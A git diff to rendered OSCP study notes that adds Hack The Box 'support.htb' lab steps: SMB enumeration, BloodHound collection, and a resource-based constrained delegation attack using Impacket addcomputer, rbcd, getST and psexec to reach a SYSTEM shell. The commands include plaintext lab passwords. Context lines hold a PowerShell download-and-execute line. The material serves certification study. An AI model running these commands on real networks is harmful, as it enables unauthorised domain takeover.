@@ -1352,11 +1352,13 @@ wine exe2bat.exe nc.exe nc.txt
 
 3. Shares: smbclient -L \\\\&lt;IP&gt;\\
 
-4. Changing Shares: smbclient -L \\\\&lt;IP&gt;\\C$
+4. Connect: smbclient -N //support.htb/support-tools
 
-5. Username/Domain/No Pass: smbclient \\\\$ip\\Public -U sequel/root
+5. Changing Shares: smbclient -L \\\\&lt;IP&gt;\\C$
 
-6. Username/Password: smbclient //flight.htb/users -U svc_apache 'S@Ss!K@*t13'
+6. Username/Domain/No Pass: smbclient \\\\$ip\\Public -U sequel/root
+
+7. Username/Password: smbclient //flight.htb/users -U svc_apache 'S@Ss!K@*t13'
 
 8. Username/password/Domain: smbclient -L \\\\&lt;IP&gt;\\C$ -U &lt;Domain&gt;/&lt;username&gt;%&lt;password&gt;
 
@@ -8007,6 +8009,17 @@ or
 <p><code>Get-ModifiablePath</code></p>
 </li>
 </ol>
+<h3 id="reverse-engineering-files"><a class="header" href="#reverse-engineering-files">Reverse Engineering Files</a></h3>
+<pre><code>You can use Ghidra or dnSpy
+https://github.com/dnSpy/dnSpy
+
+## Get File info
+file UserInfo.exe
+
+
+## Load dnSpy on Win box
+</code></pre>
+<p><img src="OSCP/OSCP-Notes/src/dnSpy.png" alt="dnSpy" /></p>
 <div style="break-before: page; page-break-before: always;"></div><h2 id="windows-privesc-exploitation"><a class="header" href="#windows-privesc-exploitation">Windows PrivEsc Exploitation</a></h2>
 <h3 id="links-14"><a class="header" href="#links-14">Links</a></h3>
 <ul>
@@ -9318,6 +9331,10 @@ powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('ht
 
 # Metasploit
 use post/windows/gather/bloodhound       
+
+
+# Run from Kali Box
+bloodhound-python -c ALL -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174
 </code></pre>
 <h3 id="bloodhound-python"><a class="header" href="#bloodhound-python">Bloodhound-python</a></h3>
 <pre><code>sudo neo4j console
@@ -10456,6 +10473,16 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 
 [*] Successfully added machine account ATTACK$ with password AttackerPC1!.
 </code></pre>
+<p>Another Example of this:</p>
+<pre><code>addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host 
+$DomainController -domain-netbios $DOMAIN 'domain/user:password'
+
+python3 addcomputer.py -computer-name 'evilcom$' -computer-pass password -dc-ip 10.10.11.174 support/support:Ironside47pleasure40Watchful
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[!] No DC host set and 'support' doesn't look like a FQDN. DNS resolution of short names will probably fail.
+[*] Successfully added machine account evilcom$ with password password.
+</code></pre>
 <p>We can verify that this machine account was added to the domain by using our <code>evil-winrm</code> session from before.</p>
 <pre><code>*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; get-adcomputer attack
 
@@ -10488,6 +10515,10 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 [*] Delegation rights modified succesfully!
 [*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
 </code></pre>
+<p>Another example of this:</p>
+<pre><code>./rbcd.py -f EVILCOM -t DC -dc-ip 10.10.11.174 support\\support:Ironside47pleasure40Watchful
+
+</code></pre>
 <p>We can confirm that this was successful by using our <code>evil-winrm</code> session.</p>
 <pre><code>*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity
 
@@ -10506,9 +10537,26 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 [*]     Requesting S4U2Proxy
 [*] Saving ticket in Administrator.ccache
 </code></pre>
+<p>Another example of this:</p>
+<pre><code>python3 getST.py -spn cifs/DC.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support/EVILCOM$:password
+
+</code></pre>
+<p>Time Error</p>
+<pre><code>If you get this:
+Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+
+Do this:
+
+rdate -n $ip
+
+</code></pre>
 <p>This saved the ticket on our Kali host as <strong>Administrator.ccache</strong>. We need to export a new environment variable named <code>KRB5CCNAME</code> with the location of this file.</p>
 <pre><code>┌──(kali㉿kali)-[~]
 └─$ export KRB5CCNAME=./Administrator.ccache
+
+or this:
+
+export KRB5CCNAME=`pwd`/Administrator.ccache
 </code></pre>
 <p>Now, all we have to do is add a new entry in <strong>/etc/hosts</strong> to point <code>resourcedc.resourced.local</code> to the target IP address and run <code>impacket-psexec</code> to drop us into a system shell.</p>
 <pre><code>┌──(kali㉿kali)-[~]
@@ -10532,6 +10580,9 @@ C:\Windows\system32&gt; whoami
 nt authority\system
 
 C:\Windows\system32&gt; 
+</code></pre>
+<p>Another example of this:</p>
+<pre><code>python3 psexec.py -k DC.support.htb
 </code></pre>
 
                     </main>
